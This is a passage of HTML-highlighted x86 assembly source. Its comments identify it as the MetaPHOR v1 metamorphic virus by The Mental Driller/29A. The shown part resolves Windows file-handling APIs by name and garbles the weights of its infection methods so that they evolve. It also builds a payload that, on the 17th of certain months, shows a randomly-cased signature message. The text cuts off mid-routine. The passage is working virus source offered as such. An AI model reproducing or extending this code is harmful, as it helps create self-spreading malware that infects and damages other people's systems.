                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunction</span><span class="sc0">   </span><span class="sc1">; Get SetEndOfFile</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_SetEndOfFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'dniF'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'sriF'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'liFt'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Ae'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunction</span><span class="sc0">   </span><span class="sc1">; Get FindFirstFileA</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_FindFirstFileA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'txeN'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'eliF'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunction</span><span class="sc0">   </span><span class="sc1">; Get FindNextFileA</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_FindNextFileA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'solC'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'e'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunction</span><span class="sc0">   </span><span class="sc1">; Get FindClose</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_FindClose</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'dnaH'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'el'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunction</span><span class="sc0">   </span><span class="sc1">; Get CloseHandle</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_CloseHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hUser32</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Maybe NULL, but it's allowed by</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'sseM'</span><span class="sc0">        </span><span class="sc1">; GetProcAddress</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Bega'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Axo'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunction</span><span class="sc0">   </span><span class="sc1">; Get MessageBoxA (from User32.DLL)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_MessageBoxA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; 0 if not found or library</span><span class="sc0">
                                                   </span><span class="sc1">; not loaded</span><span class="sc0">

</span><span class="sc1">;; Let's initialize the random seed</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">; APICALL_BEGIN</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_BUFFER1_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_GetSystemTime</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; APICALL_END</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_BUFFER1_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RndSeed1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RndSeed2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">  </span><span class="sc1">; Garble it a little</span><span class="sc0">

   </span><span class="sc1">;; Now let's make some mixtures in the weights. Since the weights are</span><span class="sc0">
   </span><span class="sc1">;; going to be hardcoded on the virus code before its use, we make here</span><span class="sc0">
   </span><span class="sc1">;; some "garblement" to force the evolution of the infection methods. With</span><span class="sc0">
   </span><span class="sc1">;; this, only the most powerful features will "survive".</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
          </span><span class="sc5">@@LoopGarbleWeights</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean_X000_3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean_X004_7</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean_X008_11</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean_X012_15</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean_X016_19</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean_X020_23</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopGarbleWeights</span><span class="sc0">


                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_MessageBoxA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NoPayload</span><span class="sc0">      </span><span class="sc1">; If we couldn't retrieve MessageBoxA,</span><span class="sc0">
                                       </span><span class="sc1">; skip the payload</span><span class="sc0">

</span><span class="sc1">;; Payload</span><span class="sc0">
</span><span class="sc1">;;---------</span><span class="sc0">
</span><span class="sc1">;; Simple, silly MessageBox with a metamorphic message :)</span><span class="sc0">
</span><span class="sc1">;; The message is "MetaPHOR v1 by The Mental Driller/29A" but selecting</span><span class="sc0">
</span><span class="sc1">;;  randomly the case of all letters.</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_BUFFER1_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">           </span><span class="sc1">; Month: March, June, September or</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Payload_Month</span><span class="sc0">    </span><span class="sc1">;    December</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Payload_Month</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Payload_Month</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@CheckPayload2</span><span class="sc0">
       </span><span class="sc5">@@Payload_Month</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc0">         </span><span class="sc1">; Day: 17</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@CheckPayload2</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20202020h</span><span class="sc0">   </span><span class="sc1">;; All the phrase is:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'ATEM'</span><span class="sc0">      </span><span class="sc1">;; "META"</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20202020h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'ROHP'</span><span class="sc0">      </span><span class="sc1">;; "PHOR"</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00200000h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">' B1 '</span><span class="sc0">      </span><span class="sc1">;; " v1 "</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20002020h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'T YB'</span><span class="sc0">      </span><span class="sc1">;; "BY T"</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20002020h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'M EH'</span><span class="sc0">      </span><span class="sc1">;; "HE M"</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20202020h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'ATNE'</span><span class="sc0">      </span><span class="sc1">;; "ENTA"</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20200020h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'RD L'</span><span class="sc0">      </span><span class="sc1">;; "L DR"</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20202020h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'ELLI'</span><span class="sc0">      </span><span class="sc1">;; "ILLE"</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000020h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'92/R'</span><span class="sc0">      </span><span class="sc1">;; "R/29"</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFF0020h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc0">         </span><span class="sc1">;; "A"</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                                  </span><span class="sc1">; "METAPHOR v1 BY THE MENTAL DRILLER/29A"</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; with random upcases and lowcases.</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; APICALL_BEGIN</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
